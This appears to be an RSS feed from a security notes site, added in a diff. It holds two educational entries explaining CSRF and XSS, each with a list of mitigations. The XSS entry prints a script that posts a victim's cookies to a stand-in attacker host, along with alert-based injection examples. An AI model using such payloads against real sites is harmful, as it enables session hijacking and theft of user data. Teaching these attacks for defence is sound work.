@@ -1,0 +1,106 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Memo – Vulnerabilities and Attack Techniques</title><link>http://forest0923.github.io/memo/en/docs/security/vulnerabilities/</link><description>Recent content in Vulnerabilities and Attack Techniques on Memo</description><generator>Hugo -- gohugo.io</generator><language>en</language><atom:link href="http://forest0923.github.io/memo/en/docs/security/vulnerabilities/index.xml" rel="self" type="application/rss+xml"/><item><title>Docs: CSRF (Cross-Site Request Forgery)</title><link>http://forest0923.github.io/memo/en/docs/security/vulnerabilities/csrf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://forest0923.github.io/memo/en/docs/security/vulnerabilities/csrf/</guid><description>
+&lt;p>Cross-Site Request Forgery (CSRF) vulnerability causes problems where critical actions can be executed due to unintentional requests from users.
+If this vulnerability is exploited, unintended purchases on shopping sites, changes to account information, or inappropriate message postings can be made without the user&amp;rsquo;s consent.&lt;/p>
+&lt;h2 id="attack-overview">Attack Overview&lt;/h2>
+&lt;p>CSRF attacks are typically carried out following these steps:&lt;/p>
+&lt;ol>
+&lt;li>The user logs into the targeted site.&lt;/li>
+&lt;li>The user visits a fake site created by the attacker.&lt;/li>
+&lt;li>The fake site sends an unintentional request to the targeted site.&lt;/li>
+&lt;/ol>
+&lt;p>In CSRF attacks, the difference from Cross-Site Scripting (XSS) attacks is that existing functionalities within the target server are exploited.&lt;/p>
+&lt;h2 id="mitigations">Mitigations&lt;/h2>
+&lt;p>The main reason CSRF attacks occur is because systems are not verifying that requests are intentional and made by a legitimate user.&lt;/p>
+&lt;p>While certain pages such as product detail pages on shopping sites should be accessible by anyone, special precautions need to be taken on pages where critical actions like purchase processes or personal information changes are performed.&lt;/p>
+&lt;h3 id="use-of-csrf-mitigation-tokens">Use of CSRF Mitigation Tokens&lt;/h3>
+&lt;p>Tokens are embedded in pages that submit forms, and sent via POST requests to be verified on the server side.
+Unless users are tricked into pressing buttons via techniques like clickjacking, it won&amp;rsquo;t be possible to send the correct token, thereby confirming that the access is not legitimate.&lt;/p>
+&lt;p>For example, when examining the form on GitLab.com&amp;rsquo;s login screen, we can see the following tag with a hidden attribute and a token stored in its value.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#6ab825;font-weight:bold">input&lt;/span> &lt;span style="color:#bbb">type&lt;/span>=&lt;span style="color:#ed9d13">&amp;#34;hidden&amp;#34;&lt;/span> &lt;span style="color:#bbb">name&lt;/span>=&lt;span style="color:#ed9d13">&amp;#34;authenticity_token&amp;#34;&lt;/span> &lt;span style="color:#bbb">value&lt;/span>=&lt;span style="color:#ed9d13">&amp;#34;xxxxxxxxxx&amp;#34;&lt;/span> &lt;span style="color:#bbb">autocomplete&lt;/span>=&lt;span style="color:#ed9d13">&amp;#34;off&amp;#34;&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>By the way, clickjacking is an attack where users are tricked into pressing buttons by overlaying important action confirmation buttons and dummy links, but countermeasures in browsers are improving.&lt;/p>
+&lt;h3 id="request-password-re-entry">Request Password Re-entry&lt;/h3>
+&lt;p>By requesting users to re-enter their passwords before executing crucial actions, we can verify that the operation is indeed being performed by the user themselves.&lt;/p>
+&lt;h3 id="verify-referer">Verify Referer&lt;/h3>
+&lt;p>The URL of the request&amp;rsquo;s origin (Referer) is checked to detect requests coming from fraudulent pages.&lt;/p>
+&lt;h3 id="use-of-two-factor-authentication">Use of Two-Factor Authentication&lt;/h3>
+&lt;p>While two-factor authentication can&amp;rsquo;t be said to directly prevent CSRF, it does enable early detection and minimizes damage if personal information has been updated unintentionally.&lt;/p>
+&lt;h2 id="references">References&lt;/h2>
+&lt;ul>
+&lt;li>徳丸 浩、「体系的に学ぶ 安全なWebアプリケーションの作り方 第2版」&lt;/li>
+&lt;/ul></description></item><item><title>Docs: XSS (Cross-Site Scripting)</title><link>http://forest0923.github.io/memo/en/docs/security/vulnerabilities/xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://forest0923.github.io/memo/en/docs/security/vulnerabilities/xss/</guid><description>
+&lt;p>Cross-site scripting is a form of cyber-attack where the attacker tricks a user into executing a malicious script.
+The attacks can lead to the disclosure of the user&amp;rsquo;s cookie information or manipulation of the web page content.&lt;/p>
+&lt;h2 id="stored-xss-attacks">Stored XSS Attacks&lt;/h2>
+&lt;p>Stored XSS attacks occur when the attacker storing a malicious JavaScript on the target website.
+This malicious input is saved into the website’s database and is executed when other users access the website.&lt;/p>
+&lt;p>For instance, in a chat application, an attacker could post the following:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#6ab825;font-weight:bold">script&lt;/span>&amp;gt;alert(&lt;span style="color:#ed9d13">&amp;#34;Hacked!&amp;#34;&lt;/span>);&amp;lt;/&lt;span style="color:#6ab825;font-weight:bold">script&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If the website does not properly escape or sanitize the input, any user who accesses the chat application and views the attacker&amp;rsquo;s post will inadvertently execute this script.
+While an alert may seem harmless, attackers could execute scripts like the following to send a user&amp;rsquo;s cookies to the attacker:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#6ab825;font-weight:bold">script&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6ab825;font-weight:bold">var&lt;/span> xhr = &lt;span style="color:#6ab825;font-weight:bold">new&lt;/span> XMLHttpRequest();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> xhr.open(&lt;span style="color:#ed9d13">&amp;#34;POST&amp;#34;&lt;/span>, &lt;span style="color:#ed9d13">&amp;#34;https://attacker.example.com/steal-data&amp;#34;&lt;/span>, &lt;span style="color:#6ab825;font-weight:bold">true&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> xhr.setRequestHeader(&lt;span style="color:#ed9d13">&amp;#34;Content-Type&amp;#34;&lt;/span>, &lt;span style="color:#ed9d13">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> xhr.send(&lt;span style="color:#ed9d13">&amp;#34;cookie=&amp;#34;&lt;/span> + &lt;span style="color:#24909d">document&lt;/span>.cookie);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/&lt;span style="color:#6ab825;font-weight:bold">script&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="reflected-xss-attacks">Reflected XSS Attacks&lt;/h2>
+&lt;p>Reflected XSS attacks are different from stored XSS attacks in that the malicious script is not stored on the target website.
+Its impact is generally more limited than stored XSS.&lt;/p>
+&lt;p>As an example, an attacker might send phishing emails or messages with a link like this:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>https://victim.example.com/search?q=&amp;lt;&lt;span style="color:#6ab825;font-weight:bold">script&lt;/span>&amp;gt;alert(&lt;span style="color:#ed9d13">&amp;#39;Hacked!&amp;#39;&lt;/span>);&amp;lt;/&lt;span style="color:#6ab825;font-weight:bold">script&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If the target website doesn&amp;rsquo;t properly handle parameters, the script might be executed.
+Just like with stored XSS, the script executed is not limited to displaying an alert.
+There are various techniques, such as embedding the target site inside an iframe on a fake website to steal session IDs or altering forms to send information to the attacker.&lt;/p>
+&lt;h2 id="mitigations">Mitigations&lt;/h2>
+&lt;p>The main cause of XSS vulnerabilities is a failure to escape special characters during HTML rendering.
+As a fundamental measure, it is necessary to systematically escape special characters within element content and attribute values, as shown in the table below:&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Special Character&lt;/th>
+&lt;th>Escape Code&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>&amp;lt;&lt;/td>
+&lt;td>&lt;code>&amp;amp;lt;&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&amp;gt;&lt;/td>
+&lt;td>&lt;code>&amp;amp;gt;&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&amp;amp;&lt;/td>
+&lt;td>&lt;code>&amp;amp;amp;&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&amp;quot;&lt;/td>
+&lt;td>&lt;code>&amp;amp;quot;&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>'&lt;/td>
+&lt;td>&lt;code>&amp;amp;#39;&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;p>Additionally, the following measures are recommended:&lt;/p>
+&lt;ul>
+&lt;li>Returning response headers that enable XSS filters through web server configuration.
+&lt;ul>
+&lt;li>Content Security Policy (CSP): A security policy controlled through server response headers, restricting external content loading and script execution.&lt;/li>
+&lt;li>X-XSS-Protection: This is now deprecated as different or older browsers have varied implementations or lack support, CSP is recommended.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Sanitizing input values (e.g., allow only numbers, letters, character limits).&lt;/li>
+&lt;li>Thoughtful cookie settings:
+&lt;ul>
+&lt;li>HttpOnly: Setting that prevents JavaScript from reading cookies.&lt;/li>
+&lt;li>SameSite: Setting that prevents cookies from being read through requests from different domains. Since there are different types of restrictions, it&amp;rsquo;s necessary to choose the appropriate setting when using it.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="references">References&lt;/h2>
+&lt;ul>
+&lt;li>徳丸 浩、「体系的に学ぶ 安全なWebアプリケーションの作り方 第2版」&lt;/li>
+&lt;/ul></description></item></channel></rss>
